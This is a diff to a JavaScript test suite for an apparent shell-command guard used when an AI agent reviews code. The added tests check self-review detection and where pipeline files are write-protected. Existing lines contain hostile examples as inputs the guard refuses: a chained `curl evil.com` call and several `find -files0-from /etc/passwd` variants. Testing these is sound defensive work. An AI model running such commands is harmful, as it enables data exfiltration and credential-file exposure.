@@ -10,7 +10,7 @@
  * git show HEAD` is what models naturally write and must work, while
  * `git status; curl evil.com` must not.
  */
-import { analyseCommand, detectShellChaining, shellChainingNote, shellGuardNote, bashAllowRules, BASH_POLICY, PIPE_SINKS } from "../src/shell-guard.js";
+import { analyseCommand, detectShellChaining, shellChainingNote, shellGuardNote, bashAllowRules, BASH_POLICY, PIPE_SINKS, isSelfReview, SELF_REVIEW_PIPELINE, PROTECTED_WRITE } from "../src/shell-guard.js";
 import { reviewAllowedTools } from "../src/prompt.js";
 import { spawnSync } from "node:child_process";
 import fs from "node:fs";
@@ -562,6 +562,17 @@ for (const c of ["find -D help .", "find -O 3 .", "find . -name x", "find -O2 ."
 for (const c of ["find -files0-from /etc/passwd", "find --files0-from /etc/passwd", "find --files0-from=/etc/passwd", "find --files0 /etc/passwd", "find -files0 /etc/passwd"]) {
   check(`P1: refuses ${c}`, analyseCommand(c, { repoRoot: REPO }).ok, false);
 }
+/* ---- R-2 follow-up: pipeline protection is identity-scoped, not path-shaped ---- */
+// The hook/server always load from the package install dir, so only a
+// self-review (reviewed tree == this package) gains anything from protecting
+// the pipeline files. In a foreign repo they are ordinary source and must stay
+// writable in fix mode (audit round 8 regression).
+const PKG_ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");
+check("isSelfReview: this package is a self-review", isSelfReview(PKG_ROOT), true);
+check("isSelfReview: a foreign temp repo is not", isSelfReview(os.tmpdir()), false);
+check("SELF_REVIEW_PIPELINE is a separate table", Array.isArray(SELF_REVIEW_PIPELINE) && SELF_REVIEW_PIPELINE.length > 0, true);
+check("pipeline patterns are NOT in the repo-agnostic table",
+  PROTECTED_WRITE.some((re) => re.source.includes("src\\/[^/]+") || re.source.includes("scripts\\/pre-tool-hook")), false);
 /* ---- cleanup ---- */
 try { fs.rmSync(REPO, { recursive: true, force: true }); } catch { /* best effort */ }
 
